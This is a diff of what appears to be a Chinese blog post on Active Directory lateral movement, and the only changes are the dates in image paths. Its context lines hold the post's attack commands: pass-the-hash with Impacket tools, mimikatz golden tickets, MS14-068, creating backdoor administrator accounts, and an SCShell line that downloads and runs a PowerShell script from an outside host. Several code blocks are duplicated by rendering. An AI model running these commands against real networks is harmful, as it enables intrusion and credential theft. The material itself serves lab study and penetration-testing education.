@@ -6,16 +6,16 @@
 <ul>
 <li>FilterAdministratorToken，默认开启，用来保护本地管理员，当本地管理员去进行网络访问时，在对方机器上以非完全管理员的方式进行访问。所以只有SID 500的账号（一般是administrator）与域管理员组的账号都可以进行PTH。</li>
 </ul>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232339392.png" alt="image-20220814232339392" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232339392.png" alt="image-20220814232339392" style="zoom:50%;">
 
 <ul>
 <li><p>LocalAccountTokenFilterPolicy，是否限制非SID 500的本地管理员进行网络访问，值默认为0（开启远程限制），为1时将关闭远程限制</p>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814231624587.png" alt="image-20220814231624587" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814231624587.png" alt="image-20220814231624587" style="zoom:50%;">
 
 <p>将LocalAccountTokenFilterPolicy关闭后，使用非administrator的管理员账号也可以进行PTH</p>
 </li>
 </ul>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232043010.png" alt="image-20220814232043010"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814232043010.png" alt="image-20220814232043010"></p>
 <p><strong>kb2871997补丁</strong></p>
 <ul>
 <li><p>支持“Protected Users”组，“Protected Users”组是Windows Server 2012 R2域中的安全组，“Protected Users”组的成员会被强制使用Kerberos身份验证，并且对Kerberos强制执行AES加密。</p>
@@ -36,7 +36,7 @@
 </li>
 </ul>
 <h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC$(Internet Process Connection) 是共享 “命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</p>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815001219892.png" alt="image-20220815001219892"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815001219892.png" alt="image-20220815001219892"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">net use \\<target_ip>\ipc$ "password" /user:"username"<br>net use \\192.168.181.1\ipc$ "123456" /user:"administrator"<br><br>net use // 查看当前主机所建立的连接<br></code></pre></td></tr></table></figure>
 
 
@@ -73,7 +73,7 @@
 </blockquote>
 <p>木马能起来，但是上线之后马上会掉，提示下面的错误，应该是exe不符合Windows的服务接口规范。</p>
 <p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1455144">https://cloud.tencent.com/developer/article/1455144</a></p>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815075914592.png" alt="image-20220815075914592"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815075914592.png" alt="image-20220815075914592"></p>
 <p><a href="lhttps://github.com/Mr-Un1k0d3r/SCShell">SCShel</a> 可以修改服务的可以执行路径执行命令达到无文件的效果：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs shell">└─# python scshell.py ./administrator:cxzcxz@192.168.52.133# 执行cmd模式，没有命令回显<br>└─# proxychains python3 scshell.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128                                                                                                                                                            <br><span class="hljs-meta">SCShell&gt;</span><span class="bash">C:\windows\system32\cmd.exe /c whoami &gt; c:/1.txt</span><br>[*] Command Executed<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">└─# python scshell.py ./administrator:cxzcxz@192.168.52.133# 执行cmd模式，没有命令回显<br>└─# proxychains python3 scshell.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128                                                                                                                                                            <br><span class="hljs-meta">SCShell&gt;</span><span class="bash">C:\windows\system32\cmd.exe /c whoami &gt; c:/1.txt</span><br>[*] Command Executed<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 执行powershell</span> <br>scshell.exe 10.10.10.10 defragsvc "C:\windows\system32\cmd.exe /c powershell.exe IEX(New-Object Net.WebClinet).DownloadString(&#x27;http://192.168.50.146:8000/123.ps1&#x27;)" . administrator 1qaz@wsx<br></code></pre></td></tr></table></figure>
 
@@ -82,7 +82,7 @@
 <h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>域环境里面域管理员可以PTH，而普通用户无法PTH</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-comment"><code class="language-hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-comment"># proxychains python3 psexec.py test.com/manager@192.168.181.128 -hashes :579da618cfbfa85247acf1f800a280a4</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814212501223.png" alt="image-20220814212501223"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814212501223.png" alt="image-20220814212501223"></p>
 <p>也可以指定运行文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─$ proxychains python3 psexec.py -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128 -c ~/artifact.exe <br></code></pre></td></tr></table></figure>
 
@@ -90,7 +90,7 @@
 
 <h2 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 wmiexec.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814223417043.png" alt="image-20220814223417043"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220814223417043.png" alt="image-20220814223417043"></p>
 <h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成，类似于DLL的东西，DCOM（分布式组件对象模型）支持不同的两台机器上的组件间的通信。</p>
 <p>可使用的COM:</p>
 <ul>
@@ -142,7 +142,7 @@
 <p>使用hash</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 dcomexec.py  -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.130 whoami<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815091856019.png" alt="image-20220815091856019"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815091856019.png" alt="image-20220815091856019"></p>
 <h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>“Windows远程管理(WinRM)”是WS-Management协议(Web Services for Management，又名WSMan)的Microsoft实现，WS-Management Protocol是基于标准简单对象访问协议(SOAP)的对防火墙友好的协议。运行来自不同硬件和操作系统的硬件和操作供应商，以实现互操作（Microsoft Docs）。</p>
 <p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WAMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代的Windows系统中，WinRM HTTP通信通过TCP端口5985进行，而HTTPS(TLS)通信是通过TCP端口5986进行的。WinRM本机支持NTLM和Kerberos。初始身份验证后，将使用AES加密保护WinRM会话（Microsoft Docs)</p>
 <blockquote>
@@ -155,9 +155,9 @@
 <p>-r dc  为目标机器的netbios名称</p>
 </blockquote>
 <p>CS JUMP WINRM</p>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815085539019.png" alt="image-20220815085539019" style="zoom:30%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815085539019.png" alt="image-20220815085539019" style="zoom:30%;">
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815093105195.png" alt="image-20220815093105195"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815093105195.png" alt="image-20220815093105195"></p>
 <h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><p>Pass The Ticket ，使用生成或者机器缓存的票据进行Kerberos认证，无需密码、Hash。</p>
 <p><strong>获取票据</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 getTGT.py -hashes :579da618cfbfa85247acf1f800a280a4 test.com/manager@192.168.181.130<br></code></pre></td></tr></table></figure>
@@ -184,18 +184,18 @@
 <p>获取aes的hmac:</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">mimikatz.exe "privilege::debug" "sekurlsa::ekeys"<br></code></pre></td></tr></table></figure>
 
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155406191.png" alt="image-20220815155406191" style="zoom:33%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155406191.png" alt="image-20220815155406191" style="zoom:33%;">
 
 <p>获得票据执行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 命令执行完后会弹出一个会话，执行IPC链接</span><br>mimikatz.exe "sekurlsa::pth /user:manager /domain:test.com /aes256:4970044a85b68514e8c95328e9ee1885a5c450a15ac7185df7e6a35efdacad4e"<br></code></pre></td></tr></table></figure>
 
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155656163.png" alt="image-20220815155656163" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155656163.png" alt="image-20220815155656163" style="zoom:50%;">
 
 <p><strong>使用impacket工具包进行PTK</strong></p>
 <p>获取aes的hmac:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 secretsdump.py  test.com/manager:&#x27;admin@123&#x27;@192.168.181.130<br></code></pre></td></tr></table></figure>
 
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155502978.png" alt="image-20220815155502978" style="zoom: 50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155502978.png" alt="image-20220815155502978" style="zoom: 50%;">
 
 <p>生成票据</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 getTGT.py -aesKey 4970044a85b68514e8c95328e9ee1885a5c450a15ac7185df7e6a35efdacad4e -dc-ip 192.168.181.130 test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
@@ -229,12 +229,12 @@
 <p>使用impacket检查hash是否可登陆:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 rdp_check.py test.com/manager@192.168.181.130 -hashes :579da618cfbfa85247acf1f800a280a4<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816003641090.png" alt="image-20220816003641090"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816003641090.png" alt="image-20220816003641090"></p>
 <h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><h1 id="RDP-会话劫持"><a href="#RDP-会话劫持" class="headerlink" title="RDP 会话劫持"></a>RDP 会话劫持</h1><p>系统管理员和用户通常可以通过 RDP（远程桌面）协议登录指定服务器3389远程桌面，<code>而攻击者可以通过可以特权提升至 SYSTEM 权限的用户，可以在不知道其他用户登录凭据的情况下，用来劫持其他用户的 RDP 会话</code>，该漏洞在2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。<code>利用条件只需要获取机器system权限执行tscon命令</code>。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs shell">net user guest /active:yes<br>net user guest test!@#123<br>net localgroup administrators guest /add<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">net user guest /active:yes<br>net user guest test!@#123<br>net localgroup administrators guest /add<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 如果guest被组策略限制了就再新建个用户</span><br>net user testtest test!@#123 /add<br>net localgroup administrators testtest /add<br></code></pre></td></tr></table></figure>
 
 <p>查看要切换的会话ID</p>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816012505246.png" alt="image-20220816012505246" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816012505246.png" alt="image-20220816012505246" style="zoom:50%;">
 
 <blockquote>
 <p>都需要有SYSTEM的权限</p>
@@ -269,7 +269,7 @@
 <p>-x 表示执行命令</p>
 <p>pwn3d! 表示有本地管理权限</p>
 </blockquote>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815125041932.png" alt="image-20220815125041932" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815125041932.png" alt="image-20220815125041932" style="zoom:50%;">
 
 <p>使用hash爆破</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains crackmapexec  smb 192.168.181.0/24   -u &#x27;manager&#x27; -H &#x27;529da644cfbfa85247acaaf800a280a4&#x27;<br></code></pre></td></tr></table></figure>
@@ -334,7 +334,7 @@
 <p>具体操作：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 清除票据</span><br>klist purge<br>mimikatz # kerberos::purge<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 生成票据</span><br>mimikatz # kerberos::golden /domain:test.com /sid:S-1-5-21-3406609810-1123648702-1926310187 /krbtgt:2498213a050ded48b21737cfa99b9254 /user:administrator /ticket:administrator.kiribi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 清除票据</span><br>klist purge<br>mimikatz # kerberos::purge<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 生成票据</span><br>mimikatz # kerberos::golden /domain:test.com /sid:S-1-5-21-3406609810-1123648702-1926310187 /krbtgt:2498213a050ded48b21737cfa99b9254 /user:administrator /ticket:administrator.kiribi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 导入票据</span><br>mimikatz # kerberos::ptt administrator.kiribi<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816094646812.png" alt="image-20220816094646812"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816094646812.png" alt="image-20220816094646812"></p>
 <p>直接dir \\机器名\\c$即可</p>
 <h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>Sliver Ticket ，如果拥有某个服务账户的Hash，可以伪造该服务的票据用来访问该服务。</p>
 <p>白银票据制作条件：</p>
@@ -399,7 +399,7 @@
 <p>3.有这台域内计算机的域用户密码和Sid</p>
 </blockquote>
 <p>环境需要装域证书服务：</p>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816105006531.png" alt="image-20220816105006531"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816105006531.png" alt="image-20220816105006531"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell">ms14-068.exe -u test3@superman.com -p Test#123 -s S-1-5-21-2030659959-700672918-1434258406-1113 -d win08.superman.com<br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">ms14-068.exe -u test3@superman.com -p Test#123 -s S-1-5-21-2030659959-700672918-1434258406-1113 -d win08.superman.com<br><span class="hljs-meta">#</span><span class="bash"> 将生成的票据导入mimikatz</span><br></code></pre></td></tr></table></figure>
 
 
@@ -416,7 +416,7 @@
 <p>然后就可以通过<code>dir</code>访问<code>OWA2013.test.com</code>的共享文件夹，此时的这个票据是拥有整个域林的控制权的。</p>
 <h2 id="钻石票"><a href="#钻石票" class="headerlink" title="钻石票"></a>钻石票</h2><p><a target="_blank" rel="noopener" href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/</a></p>
 <h1 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h1><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了。</p>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816160012354.png" alt="image-20220816160012354" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816160012354.png" alt="image-20220816160012354" style="zoom:50%;">
 
 <p>攻击利用，当设置非约束委派的机器被拿下后，诱导管理员主动过来访问可以拿到域管的票据，这种比较鸡肋。另一个经典的场景是使用打印机的Bug强制用户来访问。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用域管去登陆这台机器</span><br>└─# python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4  test.com/manager@192.168.181.131<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 在委派的机器上直接导出票据</span><br>privilege::debug <br>sekurlsa::tickets /export<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用域管去登陆这台机器</span><br>└─# python3 wmiexec.py -hashes :579da618cfbfa85247acf1f800a280a4  test.com/manager@192.168.181.131<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 在委派的机器上直接导出票据</span><br>privilege::debug <br>sekurlsa::tickets /export<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 注入票据</span><br>kerberos::ptt [0;1622d8]-2-0-60a00000-manager@krbtgt-TEST.COM.kirbi<br></code></pre></td></tr></table></figure>
@@ -438,7 +438,7 @@
 <p>Access Mask在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。</p>
 <p>TrusteesTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。</p>
 </blockquote>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816182755113.png" alt="image-20220816182755113" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816182755113.png" alt="image-20220816182755113" style="zoom:50%;">
 
 <p>如果配置错误，ACE 可能会被滥用以在 AD 域内进行横向移动或权限提升。</p>
 <p>AD域里常见可利用的ACL</p>
@@ -451,7 +451,7 @@
 <li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</li>
 </ul>
 <p>思维导图：</p>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/DACL abuse.png" alt="DACL abuse" style="zoom:100%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/DACL abuse.png" alt="DACL abuse" style="zoom:100%;">
 
 <blockquote>
 <p>bloodhoud</p>
@@ -459,7 +459,7 @@
 </blockquote>
 <p>使用bloodhoud查找这些可利用的ACL:</p>
 <p>使用 Active Directory Explorer导出域信息到bloodhoud</p>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190736641.png" alt="image-20220816190736641"><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190811255.png" alt="image-20220816190811255" style="zoom:50%;"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190736641.png" alt="image-20220816190736641"><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816190811255.png" alt="image-20220816190811255" style="zoom:50%;"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用ADExplorerSnapshot.py将dat文件解析为BloodHound可解析的格式。</span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用ADExplorerSnapshot.py将dat文件解析为BloodHound可解析的格式。</span><br><span class="hljs-meta">#</span><span class="bash"> 项目地址：https://github.com/c3c/ADExplorerSnapshot.py</span><br>python3 ADExplorerSnapshot.py result.dat -o result<br></code></pre></td></tr></table></figure>
 
 
@@ -472,20 +472,20 @@
 <blockquote>
 <p>在拿到域控权限后，可以利用组策略实现命令执行。有几个作用，第一当目标不出网时可以寻找出网机器，第二可以对指定OU(如运维部)命令执行上线，来找寻靶标！</p>
 </blockquote>
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816191743293.png" alt="image-20220816191743293" style="zoom: 50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816191743293.png" alt="image-20220816191743293" style="zoom: 50%;">
 
 
 
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192037416.png" alt="image-20220816192037416" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192037416.png" alt="image-20220816192037416" style="zoom:50%;">
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 执行命令</span><br>c:\windows\system32\cmd.exe /c for /F %X in (&#x27;hostname&#x27;) do ping %X.lsd1yc.dnslog.cn<br></code></pre></td></tr></table></figure>
 
 
 
-<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192300725.png" alt="image-20220816192300725" style="zoom:50%;">
+<img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192300725.png" alt="image-20220816192300725" style="zoom:50%;">
 
 <p>回车确定添加计划任务。</p>
-<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192559974.png" alt="image-20220816192559974"></p>
+<p><img src="/2022/05/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816192559974.png" alt="image-20220816192559974"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">gpupdate /force<br></code></pre></td></tr></table></figure>
 
 
